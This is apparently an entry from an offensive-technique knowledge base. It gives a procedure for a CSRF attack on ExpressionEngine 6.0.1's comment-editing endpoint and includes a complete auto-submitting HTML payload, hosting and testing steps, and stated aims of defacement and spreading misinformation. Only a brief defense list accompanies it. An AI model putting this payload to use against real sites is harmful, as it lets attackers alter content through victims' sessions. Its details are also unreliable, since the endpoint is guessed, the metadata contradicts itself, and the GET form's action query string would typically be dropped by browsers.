---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Craft-CSRF-Payload-for-Comment-Modification
tags:
  - csrf
  - payload-crafting
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:43.238Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-CSRF-Payload-for-Comment-Modification

## Summary

This procedure outlines crafting a malicious HTML payload that exploits the CSRF vulnerability in ExpressionEngine 6.0.1's comment modification endpoint, allowing arbitrary content changes via a forged GET request.

## Description

In ExpressionEngine 6.0.1, the comment update functionality uses unprotected GET requests without CSRF tokens, enabling attackers to forge requests from a victim's browser. The payload tricks the authenticated victim's session into sending a request like `/comments/edit?comment_id=123&content=malicious_text`, leading to unauthorized modifications. This is ideal for defacement or injecting misinformation in public comment sections. Prerequisites include knowledge of the target endpoint URL and comment IDs, obtainable via reconnaissance.

## Requirements

1. Access to host a malicious webpage (e.g., free hosting service)
2. Knowledge of the target's comment endpoint (e.g., from source code or testing)
3. Victim must be authenticated to the ExpressionEngine site

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all state-changing endpoints, including GET if used for modifications
- Enforce POST for sensitive actions and validate referer/origin headers
- Monitor for anomalous comment updates from unexpected sources

## Objectives

1. Forge a request to modify comment content without direct access
2. Exploit victim authentication for unauthorized actions
3. Achieve persistent changes like defacement

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Determine the exact URL for comment modification, typically something like `https://target.com/admin/comments/edit` based on ExpressionEngine structure.

Inspect the site's comment management interface or use browser dev tools to capture the GET request format.

### Step 2: Construct HTML Payload

**Context**: Build an HTML page that auto-triggers the GET request upon loading, using an iframe, form, or image tag to avoid user interaction.

Create a file named `csrf-payload.html` with the following content, replacing placeholders:

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
// Auto-submit form to trigger CSRF
window.onload = function() {
  var form = document.createElement('form');
  form.method = 'GET';
  form.action = 'https://target.com/admin/comments/edit?comment_id=123&content=Malicious%20content%20injected%20via%20CSRF';
  document.body.appendChild(form);
  form.submit();
};
</script>
</body>
</html>
```

> This script creates and submits a hidden form, forging the GET request. Test locally by hosting and visiting while authenticated to a test instance; verify comment changes.

### Step 3: Host and Test Payload

**Context**: Deploy the payload to a server and validate it triggers the modification.

Upload to a web host (e.g., GitHub Pages) and visit the URL while logged into the target site. Check the comment section for the injected content.

**Expected Output**: Comment updated with malicious text; no errors in browser console.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web-exploitation]]
